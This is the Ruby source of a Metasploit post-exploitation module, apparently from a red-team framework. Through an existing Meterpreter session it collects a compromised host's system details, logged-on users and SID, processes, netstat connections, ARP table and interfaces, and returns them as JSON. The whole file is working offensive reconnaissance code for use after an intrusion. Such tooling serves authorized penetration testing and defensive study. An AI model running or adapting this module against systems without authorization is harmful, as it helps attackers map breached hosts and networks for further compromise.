# -*- coding: UTF-8 -*-


class MetasploitModule < Msf::Post


  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Base system information Gather',
                      'Description'  => %q{ This module will get base systerm information using a Meterpreter session.},
                      'License'      => MSF_LICENSE,
                      'Author'       => ['viper'],
                      'Platform'     => ['win', 'linux'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options(
            [
                    OptEnum.new('INFO_PART', [false, 'which info about host,set opt to all to get all information', 'ALL', ['ALL', 'SYSINFO', 'PROCESSES', 'NETSTAT', 'ARP', 'INTERFACE']]),
            ])
  end

  # Run Method for when run command is issued
  def run
    if session.type == "shell"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)

      return
    end
    # 'ALL','SYSINFO', 'PROCESSES', 'NETSTAT', 'ARP', 'INTERFACE'
    case datastore['INFO_PART']
    when "SYSINFO"
      info = {
              "Computer"       => session.sys.config.sysinfo['Computer'],
              "OS"             => session.sys.config.sysinfo['OS'],
              "ARCH"           => session.sys.config.sysinfo['Architecture'],
              "DOMAIN"         => session.sys.config.sysinfo['Domain'],
              "SystemLanguage" => session.sys.config.sysinfo['System Language'],
              "LoggedOnUsers"  => session.sys.config.sysinfo['Logged On Users'],
              "SID"            => session.sys.config.sysinfo['SID'],
              "UserName"       => session.sys.config.sysinfo['User Name'],
      }

    when "PROCESSES"
      info = {
              "PROCESSES" => session.sys.process.get_processes,
      }
    when "NETSTAT"
      info = {
              "NETSTAT" => netstatinfo,
      }
    when "ARP"
      info = {
              "ARP" => arpinfo,
      }
    when "INTERFACE"
      info = {
              "INTERFACE" => interfaceinfo,
      }
    else
      info = {
              "Computer"       => session.sys.config.sysinfo['Computer'],
              "OS"             => session.sys.config.sysinfo['OS'],
              "ARCH"           => session.sys.config.sysinfo['Architecture'],
              "DOMAIN"         => session.sys.config.sysinfo['Domain'],
              "SystemLanguage" => session.sys.config.sysinfo['System Language'],
              "LoggedOnUsers"  => session.sys.config.sysinfo['Logged On Users'],
              "PROCESSES"      => session.sys.process.get_processes,
              "NETSTAT"        => netstatinfo,
              "ARP"            => arpinfo,
              "INTERFACE"      => interfaceinfo,
      }
    end
    begin
      pub_json_result(true,
                      nil,
                      info,
                      self.uuid)
    rescue Exception => e
      pub_json_result(false,
                      'covert to json failed',
                      e,
                      self.uuid)
    end
  end

  def netstatinfo
    netstat = Array.new
    begin
      connection_table = session.net.config.get_netstat
      connection_table.each { |connection|
        netstat << {
                "protocol"    => connection.protocol,
                "local_addr"  => connection.local_addr_str,
                "remote_addr" => connection.remote_addr_str,
                "state"       => connection.state,
                "uid"         => connection.uid,
                "inode"       => connection.inode,
                "pid_name"    => connection.pid_name}
      }
    rescue
      netstat = Array.new
    end
    netstat
  end

  def interfaceinfo
    interface_list = Array.new
    begin
      interface_table = session.net.config.get_interfaces
      interface_table.each { |interface|
        interface_list << pretty(interface)
      }
    rescue
      interface_list = Array.new
    end
    interface_list
  end

  def arpinfo
    arp_list = Array.new
    begin
      arp_table = session.net.config.arp_table
      arp_table.each { |arp|
        arp_list << {"ip_addr" => arp.ip_addr, 'mac_addr' => arp.mac_addr, "interface" => arp.interface}
      }
    rescue
      arp_list = Array.new
    end
    arp_list
  end

  def pretty(interface)
    macocts = []
    interface.mac_addr.each_byte { |o| macocts << o }
    macocts += [0] * (6 - macocts.size) if macocts.size < 6

    info = {
            "Name"         => interface.mac_name,
            "Hardware MAC" => sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
                                      macocts[0], macocts[1], macocts[2],
                                      macocts[3], macocts[4], macocts[5]),
            "MTU"          => interface.mtu,
            "Flags"        => interface.flags,
            "IPv4"         => Array.new,
            "IPv6"         => Array.new,
    }

    # If all went as planned, addrs and netmasks will have the same number
    # of elements and be properly ordered such that they match up
    # correctly.
    addr_masks = interface.addrs.zip(interface.netmasks)

    addr_masks.select { |a| Rex::Socket.is_ipv4?(a[0]) }.each { |a|
      info["IPv4"] << {"IPv4 Address" => a[0], "IPv4 Netmask" => a[1]}
    }
    addr_masks.select { |a| Rex::Socket.is_ipv6?(a[0]) }.each { |a|
      info["IPv6"] << {"IPv6 Address" => a[0], "IPv6 Netmask" => a[1]}
    }
    info
  end
end
